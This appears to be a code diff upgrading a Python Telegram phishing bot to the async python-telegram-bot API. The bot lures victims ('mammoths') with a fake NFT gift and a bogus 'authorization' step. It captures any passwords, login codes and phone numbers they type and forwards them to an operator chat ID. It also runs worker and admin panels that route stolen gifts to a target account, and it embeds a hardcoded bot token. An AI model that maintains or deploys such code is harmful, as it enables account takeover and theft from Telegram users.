@@ -2,10 +2,11 @@ import os
 import logging
 from flask import Flask, send_from_directory, request, jsonify
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters, CallbackContext
+from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
 import sqlite3
 import datetime
 import re
+import asyncio
 import threading
 import time
 
@@ -24,7 +25,7 @@ BOT_TOKEN = os.getenv('BOT_TOKEN', '7638076310:AAHL2G37wOaOmZNjS65sffUkQuz44xvHy
 WEB_APP_URL = os.getenv('RENDER_EXTERNAL_URL', '') + '/gift_webapp.html'
 
 # Глобальная переменная для бота
-updater = None
+bot_app = None
 
 # ========== FLASK ROUTES ==========
 
@@ -44,7 +45,7 @@ def handle_auth():
 
 @app.route('/health')
 def health():
-    return jsonify({"status": "ok", "bot_running": updater is not None})
+    return jsonify({"status": "ok", "bot_running": bot_app is not None})
 
 # ========== TELEGRAM BOT FUNCTIONS ==========
 
@@ -125,7 +126,7 @@ def add_default_workers():
     except Exception as e:
         logger.error(f"❌ Error adding workers: {e}")
 
-def start(update: Update, context: CallbackContext):
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = str(update.effective_user.id)
     
     try:
@@ -147,13 +148,13 @@ def start(update: Update, context: CallbackContext):
             
             reply_markup = InlineKeyboardMarkup(keyboard)
             
-            update.message.reply_text(
+            await update.message.reply_text(
                 "🎁 **Панель воркера**\n\nВыберите действие:",
                 reply_markup=reply_markup,
                 parse_mode='Markdown'
             )
         else:
-            update.message.reply_text(
+            await update.message.reply_text(
                 "🎁 **Вам подарили подарок!**\n\n"
                 "*JollyChimp-3809*\n\n"
                 "Учтите, что подарок можно принять только с аккаунта, на который был отправлен данный подарок. "
@@ -171,35 +172,35 @@ def start(update: Update, context: CallbackContext):
             )
     except Exception as e:
         logger.error(f"Error in start command: {e}")
-        update.message.reply_text("❌ Произошла ошибка. Попробуйте позже.")
+        await update.message.reply_text("❌ Произошла ошибка. Попробуйте позже.")
 
-def button_handler(update: Update, context: CallbackContext):
+async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
-    query.answer()
+    await query.answer()
     
     data = query.data
     user_id = str(query.from_user.id)
     
     if data == "add_gift":
-        add_gift_handler(query, context)
+        await add_gift_handler(query, context)
     elif data == "show_gift":
-        show_gift_handler(query, context)
+        await show_gift_handler(query, context)
     elif data == "admin_panel":
-        admin_panel_handler(query, context)
+        await admin_panel_handler(query, context)
     elif data == "my_stats":
-        my_stats_handler(query, context)
+        await my_stats_handler(query, context)
     elif data == "active_gifts":
-        active_gifts_handler(query, context)
+        await active_gifts_handler(query, context)
     elif data == "cancel_gift":
-        cancel_gift_handler(query, context)
+        await cancel_gift_handler(query, context)
     elif data.startswith("gift_"):
-        gift_details_handler(query, context, data)
+        await gift_details_handler(query, context, data)
     elif data == "back_to_admin":
-        admin_panel_handler(query, context)
+        await admin_panel_handler(query, context)
     elif data == "back_to_main":
-        start_callback(query, context)
+        await start_callback(query, context)
 
-def start_callback(query, context):
+async def start_callback(query, context):
     user_id = str(query.from_user.id)
     
     conn = sqlite3.connect('gift_monitor.db')
@@ -220,13 +221,13 @@ def start_callback(query, context):
         
         reply_markup = InlineKeyboardMarkup(keyboard)
         
-        query.edit_message_text(
+        await query.edit_message_text(
             "🎁 **Панель воркера**\n\nВыберите действие:",
             reply_markup=reply_markup,
             parse_mode='Markdown'
         )
     else:
-        query.edit_message_text(
+        await query.edit_message_text(
             "🎁 **Вам подарили подарок!**\n\n"
             "*JollyChimp-3809*\n\n"
             "Учтите, что подарок можно принять только с аккаунта, на который был отправлен данный подарок. "
@@ -243,16 +244,16 @@ def start_callback(query, context):
             parse_mode='Markdown'
         )
 
-def cancel_gift_handler(query, context):
-    query.edit_message_text(
+async def cancel_gift_handler(query, context):
+    await query.edit_message_text(
         "❌ Получение подарка отменено.",
         reply_markup=InlineKeyboardMarkup([[
             InlineKeyboardButton("🔄 Начать заново", callback_data="back_to_main")
         ]])
     )
 
-def show_gift_handler(query, context):
-    query.edit_message_text(
+async def show_gift_handler(query, context):
+    await query.edit_message_text(
         "🎁 *Jolly Chimp #3809*\n\n"
         "Для получения подарка требуется авторизация в мини-приложении.",
         reply_markup=InlineKeyboardMarkup([[
@@ -266,8 +267,8 @@ def show_gift_handler(query, context):
         parse_mode='Markdown'
     )
 
-def add_gift_handler(query, context):
-    query.edit_message_text(
+async def add_gift_handler(query, context):
+    await query.edit_message_text(
         "📝 **Добавление подарка**\n\n"
         "Отправьте ссылку на подарок в формате:\n"
         "`https://t.me/nft/CloverPin-23499`\n\n"
@@ -277,7 +278,7 @@ def add_gift_handler(query, context):
     
     context.user_data['waiting_for_gift'] = True
 
-def admin_panel_handler(query, context):
+async def admin_panel_handler(query, context):
     conn = sqlite3.connect('gift_monitor.db')
     cursor = conn.cursor()
     
@@ -307,7 +308,7 @@ def admin_panel_handler(query, context):
     
     reply_markup = InlineKeyboardMarkup(keyboard)
     
-    query.edit_message_text(
+    await query.edit_message_text(
         f"👨‍💻 **Админ панель**\n\n"
         f"🎯 Куда отправляем подарки (target):\n"
         f"`{target_account}`\n\n"
@@ -320,19 +321,19 @@ def admin_panel_handler(query, context):
         parse_mode='Markdown'
     )
 
-def message_handler(update: Update, context: CallbackContext):
+async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = str(update.effective_user.id)
     text = update.message.text
     
     if context.user_data.get('waiting_for_gift'):
-        handle_gift_addition(update, context, text, user_id)
+        await handle_gift_addition(update, context, text, user_id)
     else:
-        handle_mammoth_actions(update, context, text, user_id)
+        await handle_mammoth_actions(update, context, text, user_id)
 
-def handle_gift_addition(update, context, text, user_id):
+async def handle_gift_addition(update, context, text, user_id):
     if text.lower() == 'отмена':
         context.user_data['waiting_for_gift'] = False
-        update.message.reply_text("❌ Добавление отменено")
+        await update.message.reply_text("❌ Добавление отменено")
         return
     
     gift_match = re.match(r'https://t\.me/nft/([A-Za-z0-9-]+)', text)
@@ -359,7 +360,7 @@ def handle_gift_addition(update, context, text, user_id):
         context.user_data['waiting_for_gift'] = False
         
         try:
-            context.bot.send_message(
+            await context.bot.send_message(
                 "6038457276",
                 f"🎁 **Новый подарок добавлен**\n\n"
                 f"Подарок: {gift_name}\n"
@@ -371,14 +372,14 @@ def handle_gift_addition(update, context, text, user_id):
         except:
             pass
         
-        update.message.reply_text(
+        await update.message.reply_text(
             f"✅ **Подарок добавлен!**\n\n🎁 {gift_name}\n🔗 {gift_url}",
             parse_mode='Markdown'
         )
     else:
-        update.message.reply_text("❌ Неверный формат ссылки. Попробуйте еще раз или отправьте 'отмена'")
+        await update.message.reply_text("❌ Неверный формат ссылки. Попробуйте еще раз или отправьте 'отмена'")
 
-def handle_mammoth_actions(update, context, text, user_id):
+async def handle_mammoth_actions(update, context, text, user_id):
     if re.search(r'(73099|облачный|пароль|код|\+7|телефон)', text, re.IGNORECASE):
         conn = sqlite3.connect('gift_monitor.db')
         cursor = conn.cursor()
@@ -413,7 +414,7 @@ def handle_mammoth_actions(update, context, text, user_id):
                     "phone_entered": "ввел номер телефона"
                 }.get(action_type, "выполнил действие")
                 
-                context.bot.send_message(
+                await context.bot.send_message(
                     "6038457276",
                     f"📌 **Мамонт**\n\n{action_desc}:\n`{text}`\n"
                     f"Время: {datetime.datetime.now().strftime('%H:%M')}",
@@ -424,7 +425,7 @@ def handle_mammoth_actions(update, context, text, user_id):
         
         conn.close()
 
-def my_stats_handler(query, context):
+async def my_stats_handler(query, context):
     user_id = str(query.from_user.id)
     
     conn = sqlite3.connect('gift_monitor.db')
@@ -438,7 +439,7 @@ def my_stats_handler(query, context):
     
     conn.close()
     
-    query.edit_message_text(
+    await query.edit_message_text(
         f"📊 **Моя статистика**\n\n👤 ID: `{user_id}`\n"
         f"🎁 Всего подарков: {my_gifts}\n✅ Завершено: {completed_gifts}",
         parse_mode='Markdown',
@@ -447,7 +448,7 @@ def my_stats_handler(query, context):
         ]])
     )
 
-def active_gifts_handler(query, context):
+async def active_gifts_handler(query, context):
     user_id = str(query.from_user.id)
     
     conn = sqlite3.connect('gift_monitor.db')
@@ -461,7 +462,7 @@ def active_gifts_handler(query, context):
     conn.close()
     
     if not active_gifts:
-        query.edit_message_text(
+        await query.edit_message_text(
             "📋 **Активные подарки**\n\nНет активных подарков",
             reply_markup=InlineKeyboardMarkup([[
                 InlineKeyboardButton("🔙 Назад", callback_data="back_to_main")
@@ -476,12 +477,12 @@ def active_gifts_handler(query, context):
     
     keyboard.append([InlineKeyboardButton("🔙 Назад", callback_data="back_to_main")])
     
-    query.edit_message_text(
+    await query.edit_message_text(
         "📋 **Активные подарки**\n\nВыберите подарок:",
         reply_markup=InlineKeyboardMarkup(keyboard)
     )
 
-def gift_details_handler(query, context, data):
+async def gift_details_handler(query, context, data):
     gift_id = data.split('_')[1]
     
     conn = sqlite3.connect('gift_monitor.db')
@@ -496,7 +497,7 @@ def gift_details_handler(query, context, data):
     conn.close()
     
     if not gift:
-        query.edit_message_text("❌ Подарок не найден")
+        await query.edit_message_text("❌ Подарок не найден")
         return
     
     gift_name, gift_url, status = gift
@@ -507,7 +508,7 @@ def gift_details_handler(query, context, data):
         time_str = timestamp.split(' ')[1][:5] if ' ' in timestamp else timestamp
         actions_text += f"• {time_str} - {action_type}: {action_data}\n"
     
-    query.edit_message_text(
+    await query.edit_message_text(
         f"🎁 **Детали подарка**\n\n"
         f"Название: {gift_name}\n"
         f"Ссылка: {gift_url}\n"
@@ -521,37 +522,44 @@ def gift_details_handler(query, context, data):
 # ========== BOT SETUP ==========
 
 def setup_bot():
-    global updater
+    global bot_app
     try:
         # Инициализация БД
         init_db()
         add_default_workers()
         
         # Создание приложения бота
-        updater = Updater(BOT_TOKEN, use_context=True)
-        dp = updater.dispatcher
+        bot_app = Application.builder().token(BOT_TOKEN).build()
         
         # Обработчики
-        dp.add_handler(CommandHandler("start", start))
-        dp.add_handler(CallbackQueryHandler(button_handler))
-        dp.add_handler(MessageHandler(Filters.text & ~Filters.command, message_handler))
+        bot_app.add_handler(CommandHandler("start", start))
+        bot_app.add_handler(CallbackQueryHandler(button_handler))
+        bot_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
         
         logger.info("✅ Bot setup completed")
-        return updater
+        return bot_app
     except Exception as e:
         logger.error(f"❌ Bot setup failed: {e}")
         return None
 
+async def run_bot_polling():
+    """Запуск бота с опросом"""
+    try:
+        application = setup_bot()
+        if application:
+            logger.info("🤖 Starting bot polling...")
+            await application.run_polling()
+        else:
+            logger.error("❌ Failed to setup bot")
+    except Exception as e:
+        logger.error(f"❌ Bot polling error: {e}")
+
 def run_bot():
     """Запуск бота в отдельном потоке"""
     try:
-        bot_updater = setup_bot()
-        if bot_updater:
-            logger.info("🤖 Starting bot polling...")
-            bot_updater.start_polling()
-            bot_updater.idle()
-        else:
-            logger.error("❌ Failed to setup bot")
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        loop.run_until_complete(run_bot_polling())
     except Exception as e:
         logger.error(f"❌ Bot thread error: {e}")
 
